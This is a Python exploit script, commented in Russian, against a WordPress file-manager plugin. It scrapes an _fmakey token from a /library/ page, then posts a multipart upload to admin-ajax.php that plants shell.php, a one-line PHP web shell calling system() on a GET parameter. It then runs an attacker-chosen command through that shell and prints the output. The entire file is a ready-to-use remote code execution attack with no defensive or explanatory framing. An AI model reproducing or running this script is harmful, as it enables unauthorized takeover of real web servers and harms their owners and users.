#!/usr/bin/env python3
import requests
import json
import sys
import re

PROCESS = "\033[1;34;40m[*]\033[0m"
SUCCESS = "\033[1;32;40m[+]\033[0m"
FAIL = "\033[1;31;40m[-]\033[0m"

if len(sys.argv) < 3:
    print(f"Use: {sys.argv[0]} <host> <command>")
    sys.exit(1)

IP = sys.argv[1]
COMMAND = sys.argv[2]

# 1. Ищем fmakey на странице /library/
target_url = f"http://{IP}/library/"
print(f"{PROCESS} Fetching fmakey from {target_url}")

try:
    r = requests.get(target_url, timeout=10)
    # Гибкая регулярка: ищет и 'fmakey': '...', и "fmakey":"..."
    match = re.search(r"['\"]?_fmakey['\"]?\s*:\s*['\"]([a-zA-Z0-9]+)['\"]", r.text)
    
    if match:
        fmakey = match.group(1)
        print(f"{SUCCESS} Found fmakey: {fmakey}")
    else:
        print(f"{FAIL} Cannot find fmakey in page source. Check URL or page format.")
        sys.exit(1)
except Exception as e:
    print(f"{FAIL} Error fetching page: {e}")
    sys.exit(1)

# 2. Формируем запрос
ajax_url = f"http://{IP}/wp-admin/admin-ajax.php"
print(f"{PROCESS} Sending AJAX request to: {ajax_url}")

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36", 
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryI52DGCOt37rixRS1", 
    "Accept": "*/*"
}

# Собираем multipart тело
data = "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n\r\n"
data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n"
data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n"
data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nfma_load_shortcode_fma_ui\r\n"
data += f"------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"_fmakey\"\r\n\r\n{fmakey}\r\n"
data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"upload_allow\"\r\n\r\ntext/x-php\r\n"
data += "------WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"shell.php\"\r\nContent-Type: text/x-php\r\n\r\n<?php system($_GET['cmd']); ?>\r\n"
data += "------WebKitFormBoundaryI52DGCOt37rixRS1--\r\n"

try:
    r = requests.post(ajax_url, headers=headers, data=data, timeout=10)
    
    if 'errUploadMime' in r.text:
        print(f'{FAIL} Exploit failed! Server rejected the file type.')
        print(r.text)
        sys.exit(1)
    
    # Пытаемся распарсить JSON
    try:
        exploited = json.loads(r.text)
        if "added" in exploited:
            shell_url = exploited["added"][0]["url"]
            print(f'{SUCCESS} Exploit uploaded successfully!')
            print(f"{PROCESS} Shell URL: {shell_url}")
            
            # 3. Выполняем команду
            print(f"{PROCESS} Executing command: {COMMAND}")
            r_exec = requests.get(f"{shell_url}?cmd={COMMAND}", timeout=10)
            print(f'{SUCCESS} Command output:')
            print(r_exec.text)
        else:
            print(f"{FAIL} Upload failed. Response: {r.text}")
    except json.JSONDecodeError:
        print(f"{FAIL} Server returned non-JSON. Probably upload failed.")
        print(f"Response: {r.text[:500]}")

except Exception as e:
    print(f"{FAIL} Error during exploit: {e}")
